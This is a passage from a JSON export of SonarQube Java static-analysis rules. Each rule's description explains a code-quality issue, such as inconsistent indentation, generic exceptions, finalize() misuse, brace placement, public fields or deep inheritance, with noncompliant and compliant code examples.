sub-expressions","tags":["cwe","cert","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Indentation should be consistent to make the code easy to read, review and modify. To fix this issue, change the indentation so that the text\nstarts at the expected column.</p>\n<h2>Why is this an issue?</h2>\n<p>Consistent indentation is a simple and effective way to improve the codeâs readability. It reduces the differences that are committed to source\ncontrol systems, making code reviews easier.</p>\n<p>This rule raises an issue when the indentation does not match the configured value. Only the first line of a badly indented section is\nreported.</p>\n<p>The rule behaves consistently when the indentation settings of the IDE use <em>spaces</em> instead of <em>tabs</em>. Using <em>tabs</em> can lead\nto inconsistent indentation because the width of a <em>tab</em> can be configured differently in different environments.</p>\n<h3>What is the potential impact?</h3>\n<p>The readability is decreased. It becomes more tedious to review and modify the code.</p>\n<h2>How to fix it</h2>\n<p>Change the indentation so that the text starts at the expected column. The expected column should be the configured indent size multiplied by the\nlevel at which the code block is nested.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>With an indent size of 2:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass Foo {\n  public int a;\n   public int b;   // Noncompliant, expected to start at column 4\n\n...\n\n  public void doSomething() {\n    if(something) {\n          doSomethingElse();  // Noncompliant, expected to start at column 6\n  }   // Noncompliant, expected to start at column 4\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass Foo {\n  public int a;\n  public int b;\n\n...\n\n  public void doSomething() {\n    if(something) {\n      doSomethingElse();\n    }\n  }\n}\n</pre>\n<h3>Going the extra mile</h3>\n<p>You can adopt a tool or configure your IDE to take care of code formatting automatically.</p>\n<h2>Resources</h2>\n<h3>External coding guidelines</h3>\n<ul>\n  <li> <a href=\"https://google.github.io/styleguide/javaguide.html\">Google Java Style Guide</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1120","summary":"Source code should be indented consistently","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when a generic exception (such as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, or\n<code>Exception</code>) is thrown.</p>\n<h2>Why is this an issue?</h2>\n<p>Throwing generic exceptions such as <code>Error</code>, <code>RuntimeException</code>, <code>Throwable</code>, and <code>Exception</code> will have\na negative impact on any code trying to catch these exceptions.</p>\n<p>From a consumer perspective, it is generally a best practice to only catch exceptions you intend to handle. Other exceptions should ideally be let\nto propagate up the stack trace so that they can be dealt with appropriately. When a generic exception is thrown, it forces consumers to catch\nexceptions they do not intend to handle, which they then have to re-throw.</p>\n<p>Besides, when working with a generic type of exception, the only way to distinguish between multiple exceptions is to check their message, which is\nerror-prone and difficult to maintain. Legitimate exceptions may be unintentionally silenced and errors may be hidden.</p>\n<p>For instance, when a <code>Throwable</code> is caught and not re-thrown, it may mask errors such as <code>OutOfMemoryError</code> and prevent the\nprogram from terminating gracefully.</p>\n<p>When throwing an exception, it is therefore recommended to throw the most specific exception possible so that it can be handled intentionally by\nconsumers.</p>\n<h3>Exceptions</h3>\n<p>Generic exceptions in the signatures of overriding methods are ignored, because an overriding method has to follow the signature of the throw\ndeclaration in the superclass. The issue will be raised on superclass declaration of the method (or wonât be raised at all if superclass is not part\nof the analysis).</p>\n<pre>\n@Override\npublic void myMethod() throws Exception {...}\n</pre>\n<p>Generic exceptions are also ignored in the signatures of methods that make calls to methods that throw generic exceptions.</p>\n<pre>\npublic void myOtherMethod() throws Exception {\n  doTheThing();  // this method throws Exception\n}\n</pre>\n<h2>How to fix it</h2>\n<p>To fix this issue, make sure to throw specific exceptions that are relevant to the context in which they arise. It is recommended to either:</p>\n<ul>\n  <li> Raise a specific exception from the Java standard library when one matches. For example an <code>IllegalArgumentException</code> should be\n  thrown when a method receives an invalid argument. </li>\n  <li> Create a custom exception class deriving from <code>Exception</code> or one of its subclasses. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid checkValue(int value) throws Throwable { // Noncompliant: signature is too broad\n    if (value == 42) {\n        throw new RuntimeException(\"Value is 42\"); // Noncompliant: This will be difficult for consumers to handle\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid checkValue(int value) {\n    if (value == 42) {\n        throw new IllegalArgumentException(\"Value is 42\"); // Compliant\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/397\">CWE-397 Declaration of Throws for Generic Exception</a> </li>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/x/_DdGBQ\">ERR07-J. Do not throw RuntimeException, Exception, or Throwable</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S1181} - Generic exceptions should not be caught </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-112","summary":"Generic exceptions should never be thrown","tags":["cwe","error-handling","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Labels are not commonly used in Java, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to\nfollow, which reduces the codeâs readability.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint matrix[][] = {\n  {1, 2, 3},\n  {4, 5, 6},\n  {7, 8, 9}\n};\n\nouter: for (int row = 0; row &lt; matrix.length; row++) {   // Non-Compliant\n  for (int col = 0; col &lt; matrix[row].length; col++) {\n    if (col == row) {\n      continue outer;\n    }\n    System.out.println(matrix[row][col]);                // Prints the elements under the diagonal, i.e. 4, 7 and 8\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nfor (int row = 1; row &lt; matrix.length; row++) {          // Compliant\n  for (int col = 0; col &lt; row; col++) {\n    System.out.println(matrix[row][col]);                // Also prints 4, 7 and 8\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1119","summary":"Labels should not be used","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Whenever there are portions of code that are duplicated and do not depend on the state of their container class, they can be centralized inside a\n\"utility class\". A utility class is a class that only has static members, hence it should not be instantiated.</p>\n<h3>Exceptions</h3>\n<p>When a class contains <code>public static void main(String[] args)</code> method it is not considered as a utility class and will be ignored by\nthis rule.</p>\n<h2>How to fix it</h2>\n<p>To prevent the class from being instantiated, you should define a non-public constructor. This will prevent the compiler from implicitly generating\na public parameterless constructor.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass StringUtils { // Noncompliant\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass StringUtils { // Compliant\n\n  private StringUtils() {\n    throw new IllegalStateException(\"Utility class\");\n  }\n\n  public static String concatenate(String s1, String s2) {\n    return s1 + s2;\n  }\n\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1118","summary":"Utility classes should not have public constructors","tags":["design"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Shadowing occurs when a local variable has the same name as a variable or a field in an outer scope.</p>\n<p>This can lead to three main problems:</p>\n<ul>\n  <li> Confusion: The same name can refer to different variables in different parts of the scope, making the code hard to read and understand. </li>\n  <li> Unintended Behavior: You might accidentally use the wrong variable, leading to hard-to-detect bugs. </li>\n  <li> Maintenance Issues: If the inner variable is removed or renamed, the codeâs behavior might change unexpectedly because the outer variable is\n  now being used. </li>\n</ul>\n<p>To avoid these problems, rename the shadowing, shadowed, or both identifiers to accurately represent their purpose with unique and meaningful\nnames.</p>\n<p>This rule focuses on variables in methods that shadow a field.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass Foo {\n  public int myField;\n\n  public void doSomething() {\n    int myField = 0; // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes\">DCL51-J. Do not\n  shadow or obscure identifiers in subscopes</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S2176} - Class names should not shadow interfaces or superclasses </li>\n  <li> {rule:java:S2387} - Child class fields should not shadow parent class fields </li>\n  <li> {rule:java:S4977} - Type parameters should not shadow other type parameters </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1117","summary":"Local variables should not shadow class fields","tags":["cert","suspicious","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Empty statements represented by a semicolon <code>;</code> are statements that do not perform any operation. They are often the result of a typo or\na misunderstanding of the language syntax. It is a good practice to remove empty statements since they donât add value and lead to confusion and\nerrors.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nvoid doSomething() {\n  ; // Noncompliant - was used as a kind of TODO marker\n}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");; // Noncompliant - double ;\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nvoid doSomething() {}\n\nvoid doSomethingElse() {\n  System.out.println(\"Hello, world!\");\n  // ...\n  for (int i = 0; i &lt; 3; i++) ; // Compliant if unique statement of a loop\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/IDZGBQ\">CERT, MSC51-J.</a> - Do not place a semicolon immediately following an if, for, or while\n  condition </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/WtYxBQ\">CERT, EXP15-C.</a> - Do not place a semicolon on the same line as an if, for, or while\n  statement </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-1116","summary":"Empty statements should be removed","tags":["cert","unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>Overriding the <code>Object.finalize()</code> method must be done with caution to dispose some system resources.</p>\n<p>Calling the <code>super.finalize()</code> at the end of this method implementation is highly recommended in case parent implementations must also\ndispose some system resources.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprotected void finalize() {   // Noncompliant; no call to super.finalize();\n  releaseSomeResources();\n}\n\nprotected void finalize() {\n  super.finalize();  // Noncompliant; this call should come last\n  releaseSomeResources();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprotected void finalize() {\n  releaseSomeResources();\n  super.finalize();\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/568\">CWE-568 - finalize() Method Without super.finalize()</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>\n\n","impacts":[],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1114","summary":"\"super.finalize()\" should be called at the end of \"Object.finalize()\" implementations","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Before it reclaims storage from an object that is no longer referenced, the garbage collector calls <code>finalize()</code> on the object.</p>\n<p>But there is no guarantee that this method will be called as soon as the last references to the object are removed.</p>\n<p>It can be few microseconds to few minutes later.</p>\n<p>For this reason relying on overriding the <code>finalize()</code> method to release resources or to update the state of the program is highly\ndiscouraged.</p>\n<h3>What is the potential impact?</h3>\n<p>More unexpected issues can be caused by relying on the <code>finalize()</code> method to perform important operations on the application state:</p>\n<ul>\n  <li> The JVM might terminate without ever calling this method on a particular object, leaving an unexpected or incomplete state of the program </li>\n  <li> Uncaught exceptions will be ignored inside this method, making it harder to detect issues that could have been logged otherwise </li>\n  <li> Finalizer methods can also be invoked concurrently, even on single-threaded applications, making it hard to maintain desired program invariants\n  </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  @Override\n  protected void finalize() { // Noncompliant\n    releaseSomeResources();\n  }\n\n}\n</pre>\n<h3>Exceptions</h3>\n<p>It is allowed to override the <code>finalize()</code> method as <code>final</code> method with an empty body, to prevent the <em>finalizer\nattack</em> as described in <em>MET12-J-EX1</em>.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-12.html#jls-12.6\">docs.oracle.com</a> - Finalization of Class Instances </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1113","summary":"The \"Object.finalize()\" method should not be overridden","tags":["unpredictable","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Before it reclaims storage from an object that is no longer referenced, the garbage collector calls <code>finalize()</code> on the object.</p>\n<p>This is a good time to release resources held by the object.</p>\n<p>Because the general contract is that the <code>finalize</code> method should only be called once per object, calling this method explicitly is\nmisleading and does not respect this contract.</p>\n<h3>What is the potential impact?</h3>\n<p>An explicit call to an objectâs finalize method will perform operations that most likely were supposed to be performed only when the object was not\nreferenced anymore by any thread.</p>\n<p>Since it is an acceptable practice to override the finalize method in any subclass of <code>Object</code>, by invoking it explicitly, we will run\ncode that was designed to only be ran at a different time.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void dispose() throws Throwable {\n  this.finalize();                       // Noncompliant\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-12.html#jls-12.6\">docs.oracle.com</a> - Finalization of Class Instances </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/586\">CWE-586 - Explicit Call to Finalize()</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/4jZGBQ\">CERT, MET12-J.</a> - Do not use finalizers </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1111","summary":"The \"Object.finalize()\" method should not be called","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Parentheses can disambiguate the order of operations in complex expressions and make the code easier to understand.</p>\n<pre>\na = (b * c) + (d * e); // Compliant: the intent is clear.\n</pre>\n<p>Redundant parentheses are parenthesis that do not change the behavior of the code, and do not clarify the intent. They can mislead and complexify\nthe code. They should be removed.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nint x = ((y / 2 + 1)); // Noncompliant\n\nif (a &amp;&amp; ((x + y &gt; 0))) { // Noncompliant\n  return ((x + 1)); // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nint x = (y / 2 + 1);\n\nif (a &amp;&amp; (x + y &gt; 0)) {\n  return (x + 1);\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1110","summary":"Redundant pairs of parentheses should be removed","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions make it possible for a team to efficiently collaborate. This rule makes it mandatory to place a close curly brace at the\nbeginning of a line.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif(condition) {\n  doSomething();}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h3>Exceptions</h3>\n<p>When blocks are inlined (open and close curly braces on the same line), no issue is triggered.</p>\n<pre>\nif(condition) {doSomething();}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1109","summary":"A close curly brace should be located at the beginning of a line","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on\ntwo different lines.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {          // Noncompliant\n    doSomethingElse();\n  }\n  else {                               // Compliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  }\n  else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  }\n  catch (Exception e) {\n    log(e);\n  }\n  finally {\n    closeConnection();\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1108","summary":"Close curly brace and the next \"else\", \"catch\" and \"finally\" keywords should be on two different lines","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place closing curly braces on the same line as the next <code>else</code>, <code>catch</code> or\n<code>finally</code> keywords.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  }\n  else {                               // Noncompliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  }\n  finally {                            // Noncompliant\n    closeConnection();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {\n    doSomethingElse();\n  } else {\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {\n    log(e);\n  } finally {\n    closeConnection();\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"covered","ruleKey":"RSPEC-1107","summary":"Close curly brace and the next \"else\", \"catch\" and \"finally\" keywords should be located on the same line","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared coding conventions make it possible to collaborate efficiently. This rule makes it mandatory to place the open curly brace at the beginning\nof a line.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void myMethod {  // Noncompliant\n  if(something) {  // Noncompliant\n    executeTask();\n  } else {  // Noncompliant\n    doSomethingElse();\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void myMethod\n{\n  if(something)\n  {\n    executeTask();\n  } else\n  {\n    doSomethingElse();\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1106","summary":"An open curly brace should be located at the beginning of a line","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Shared naming conventions allow teams to collaborate effectively. This rule raises an issue when an open curly brace is not placed at the end of a\nline of code.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nif(condition)\n{\n  doSomething();\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h3>Exceptions</h3>\n<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered.</p>\n<pre>\nif(condition) {doSomething();}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-1105","summary":"An open curly brace should be located at the end of a line","tags":["convention"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Public fields in public classes do not respect the encapsulation principle and have three main disadvantages:</p>\n<ul>\n  <li> Additional behavior such as validation cannot be added. </li>\n  <li> The internal representation is exposed, and cannot be changed afterwards. </li>\n  <li> Member values are subject to change from anywhere in the code and may not meet the programmerâs assumptions. </li>\n</ul>\n<p>To prevent unauthorized modifications, private attributes and accessor methods (set and get) should be used.</p>\n<h3>What is the potential impact?</h3>\n<p>Public fields can be modified by any part of the code and this can lead to unexpected changes and hard-to-trace bugs.</p>\n<p>Public fields donât hide the implementation details. As a consequence, it is no longer possible to change how the data is stored internally without\nimpacting the client code of the class.</p>\n<p>The code is harder to maintain.</p>\n<h3>Exceptions</h3>\n<p>This rule ignores <code>public final</code> fields because they are not modifiable. Also, annotated fields, whatever the annotation(s) will be\nignored, as annotations are often used by injection frameworks, which in exchange require having public fields.</p>\n<h2>How to fix it</h2>\n<p>Depending on your need there are multiple options:</p>\n<ul>\n  <li> Encapsulate the field\n    <ol>\n      <li> Make the field private. </li>\n      <li> Define methods to get and set the value of the field.<br> These methods are commonly known as getter and setter methods and are prefixed by\n      <code>get</code> and <code>set</code> followed by the name of the field. <em>Note:</em> as a bonus it is now possible to monitor value changes\n      using breakpoints. </li>\n    </ol>  </li>\n  <li> Mark the field as <code>public final</code> if it is not supposed to change. </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  public String firstName;                       // Noncompliant\n\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  private String firstName;\n\n  public String getFirstName() {\n    return firstName;\n  }\n\n  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }\n\n}\n</pre>\n<h3>How does this work?</h3>\n<p>By having a setter and a getter the code can control how the field is accessed and modified. For example, adding validation in the setter method\nwill ensure that only valid values are set.</p>\n<p>The access modifiers on the setter can also be changed to <code>private</code> or <code>protected</code> to restrain which code can modify the\nvalue.</p>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/493\">CWE-493 - Critical Public Variable Without Final Modifier</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-1104","summary":"Class variable fields should not have public accessibility","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Inheritance is one of the most valuable concepts in object-oriented programming. Itâs a way to categorize and reuse code by creating collections of\nattributes and behaviors called classes, which can be based on previously created classes.</p>\n<p>But abusing this concept by creating a deep inheritance tree can lead to complex and unmaintainable source code. Often, an inheritance tree\nbecoming too deep is the symptom of systematic use of \"inheritance\" when other approaches like \"composition\" would be better suited.</p>\n<p>This rule raises an issue when the inheritance tree, starting from <code>Object</code>, has a greater depth than is allowed.</p>\n<p>The rule has one parameter to filter out classes of the count of inheritance. The following rules apply to define this parameter:</p>\n<ul>\n  <li> <code>?</code> matches a single character </li>\n  <li> <code>*</code> matches zero or more characters </li>\n  <li> <code>**</code> matches zero or more packages </li>\n</ul>\n<p>Examples:</p>\n<ul>\n  <li> <code>java.fwk.AbstractFwkClass</code>: the count stops when AbstractFwkClass class is reached. </li>\n  <li> <code>java.fwk.*</code>: any member of java.fwkPackage package is reached. </li>\n  <li> <code>java.fwk.**</code>: same as above, but including sub-packages. </li>\n</ul>\n<h2>Exceptions:</h2>\n<p>The rule stops counting when it encounters a class from one of the following packages (or sub-packages):</p>\n<ul>\n  <li> <code>android.**</code> </li>\n  <li> <code>com.intellij.**</code> </li>\n  <li> <code>com.persistit.**</code> </li>\n  <li> <code>javax.swing.**</code> </li>\n  <li> <code>org.eclipse.**</code> </li>\n  <li> <code>org.springframework.**</code> </li>\n</ul>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<p><a href=\"https://en.wikipedia.org/wiki/Composition_over_inheritance\">Composition over inheritance: difference between composition and inheritance\nin object-oriented programming</a></p>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-110","summary":"Inheritance tree of classes should not be too deep","tags":["architecture"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>A magic number is a hard-coded numerical value that may lack context or meaning. They should not be used because they can make the code less\nreadable and maintainable.</p>\n<h2>Why is this an issue?</h2>\n<p>Magic numbers make the code more complex to understand as it requires the reader to have knowledge about the global context to understand the\nnumber itself. Their usage may seem obvious when writing the code, but it may not be the case for another developer or later once the context faded\naway. -1, 0, and 1 are not considered magic numbers.</p>\n<h3>Exceptions</h3>\n<p>This rule ignores <code>hashCode</code> methods.</p>\n<h2>How to fix it</h2>\n<p>Replacing them with a constant allows us to provide a meaningful name associated with the value. Instead of adding complexity to the code, it\nbrings clarity and helps to understand the context and the global meaning.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void 